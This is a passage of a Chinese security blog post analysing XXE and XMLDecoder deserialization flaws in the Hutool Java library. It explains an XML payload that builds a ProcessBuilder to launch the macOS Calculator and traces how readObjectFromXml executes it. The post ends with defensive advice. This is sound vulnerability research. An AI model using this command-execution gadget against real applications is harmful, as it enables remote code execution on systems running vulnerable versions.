+<li><array class="java.lang.String" length="2">表示 ProcessBuilder 的构造方法的参数是一个 String 数组。length&#x3D;”2” 说明数组的长度为 2。</array></li>
+<li><void index="0"> 和 <void index="1">：表示数组中的元素。分别是第一个和第二个参数。</void></void></li>
+<li><string>open</string>：第一个元素，表示 open 命令。</li>
+<li><string>&#x2F;System&#x2F;Applications&#x2F;Calculator.app</string>：第二个元素，表示要打开的程序路径（macOS 系统中的计算器应用）。</li>
+<li><void method="start">：表示调用 ProcessBuilder 对象的 start 方法，用于启动命令</void></li>
+</ul>
+<p>该 XML 解析后等价于以下 Java 代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;open&quot;</span>, <span class="string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;).start();</span><br></pre></td></tr></table></figure>
+<p>ProcessBuilder 构造一个子进程并启动它，这样就执行了恶意代码（在 macOS 上启动了计算器应用）。</p>
+<h3 id="XmlUtil-readObjectFromXml-的反序列化过程"><a href="#XmlUtil-readObjectFromXml-的反序列化过程" class="headerlink" title="XmlUtil.readObjectFromXml 的反序列化过程"></a><strong>XmlUtil.readObjectFromXml 的反序列化过程</strong></h3><ul>
+<li>XMLDecoder <strong>实例化</strong>：调用 XmlUtil.readObjectFromXml 方法时，内部会创建 XMLDecoder 实例，并将 XML 字符串传递给它。</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">XMLDecoder</span> <span class="variable">xmldec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLDecoder</span>(source);</span><br></pre></td></tr></table></figure>
+<p><img src="6Y0ajjH1qPfmXo_5et8Vf0LCcMExQXniNeebZ9XNNmc.png" alt="image"></p>
+<ul>
+<li><strong>XML 解析</strong>：XMLDecoder 开始解析 XML 文件。它根据 XML 标签中的 class 属性，通过反射创建对应的 Java 对象。</li>
+<li>object class&#x3D;”java.lang.ProcessBuilder”：XMLDecoder 会通过反射创建 ProcessBuilder 对象。</li>
+<li><strong>属性赋值</strong>：XMLDecoder 会为 ProcessBuilder 对象设置构造参数，使用的是  中定义的 String 数组参数。</li>
+<li><strong>方法调用</strong>：XMLDecoder 解析  时，会调用 ProcessBuilder 对象的 start 方法，最终执行恶意代码。</li>
+</ul>
+<h3 id="防御XML反序列化漏洞"><a href="#防御XML反序列化漏洞" class="headerlink" title="防御XML反序列化漏洞"></a><strong>防御XML反序列化漏洞</strong></h3><p>• 在最新版的 hutool （5.8.12）没有用黑名单进行拦截，而是直接移除了 <code>readObjectFromXml</code> 方法。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h2><p>Hutool作为一个高效的Java工具库，在处理XML数据时非常便捷，但同时也可能带来安全隐患。开发者在使用时应注意以下几点：</p>
+<ol>
+<li><strong>禁用外部实体</strong>：在XML解析中，应确保禁用 DOCTYPE 和外部实体声明，防止XXE攻击。</li>
+<li><strong>谨慎反序列化</strong>：避免对不受信任的XML数据进行反序列化操作，防止潜在的漏洞。</li>
+<li><strong>使用安全配置</strong>：确保XML解析器的配置符合安全最佳实践，避免使用不安全的默认设置。</li>
+</ol>
+<p>通过这些措施，可以有效防止Hutool中的XXE漏洞和XML反序列化漏洞，确保应用程序的安全性。</p>
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a><strong>参考文献</strong></h2><p>• OWASP XXE 防护指南</p>
+<p>• Hutool 官方文档</p>
+<p>• Java XML 安全最佳实践</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">文章</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#hutoolXXE%E6%BC%8F%E6%B4%9E%E4%B8%8EXML%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">hutoolXXE漏洞与XML反序列漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hutool-%E4%B8%AD%E7%9A%84-XXE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">Hutool 中的 XXE 漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XmlUtil-parseXml%E6%96%B9%E6%B3%95%E5%88%86%E6%9E%90"><span class="toc-number">1.2.1.</span> <span class="toc-text">XmlUtil.parseXml方法分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84DocumentBuilder"><span class="toc-number">1.2.2.</span> <span class="toc-text">不安全的DocumentBuilder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E8%AF%B4%E6%98%8E"><span class="toc-number">1.2.3.</span> <span class="toc-text">代码说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.2.4.</span> <span class="toc-text">成功复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">XML反序列化漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF"><span class="toc-number">1.3.1.</span> <span class="toc-text">漏洞背景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">1.3.2.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.3.3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XmlUtil-readObjectFromXml-%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B"><span class="toc-number">1.3.4.</span> <span class="toc-text">XmlUtil.readObjectFromXml 的反序列化过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1XML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.5.</span> <span class="toc-text">防御XML反序列化漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="toc-number">1.5.</span> <span class="toc-text">参考文献</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2024/09/25/hutoolXXE%E6%BC%8F%E6%B4%9E%E4%B8%8EXML%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2024/09/25/hutoolXXE%E6%BC%8F%E6%B4%9E%E4%B8%8EXML%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/&text=hutoolXXE漏洞与XML反序列漏洞分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2024/09/25/hutoolXXE%E6%BC%8F%E6%B4%9E%E4%B8%8EXML%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/&title=hutoolXXE漏洞与XML反序列漏洞分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2024/09/25/hutoolXXE%E6%BC%8F%E6%B4%9E%E4%B8%8EXML%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/&is_video=false&description=hutoolXXE漏洞与XML反序列漏洞分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=hutoolXXE漏洞与XML反序列漏洞分析&body=Check out this article: https://garckz.github.io/2024/09/25/hutoolXXE%E6%BC%8F%E6%B4%9E%E4%B8%8EXML%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2024/09/25/hutoolXXE%E6%BC%8F%E6%B4%9E%E4%B8%8EXML%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/&title=hutoolXXE漏洞与XML反序列漏洞分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2024/09/25/hutoolXXE%E6%BC%8F%E6%B4%9E%E4%B8%8EXML%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/&title=hutoolXXE漏洞与XML反序列漏洞分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2024/09/25/hutoolXXE%E6%BC%8F%E6%B4%9E%E4%B8%8EXML%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/&title=hutoolXXE漏洞与XML反序列漏洞分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2024/09/25/hutoolXXE%E6%BC%8F%E6%B4%9E%E4%B8%8EXML%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/&title=hutoolXXE漏洞与XML反序列漏洞分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2024/09/25/hutoolXXE%E6%BC%8F%E6%B4%9E%E4%B8%8EXML%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/&name=hutoolXXE漏洞与XML反序列漏洞分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2024/09/25/hutoolXXE%E6%BC%8F%E6%B4%9E%E4%B8%8EXML%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/&t=hutoolXXE漏洞与XML反序列漏洞分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+    <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2019-2026
+        Garck3h
+    </div>
+    <div class="footer-right">
+        <nav>
+
+            <ul>
+                
+                    <!-- 不蒜子统计 -->
+                    <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+
+                    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+
+
+        </nav>
+    </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
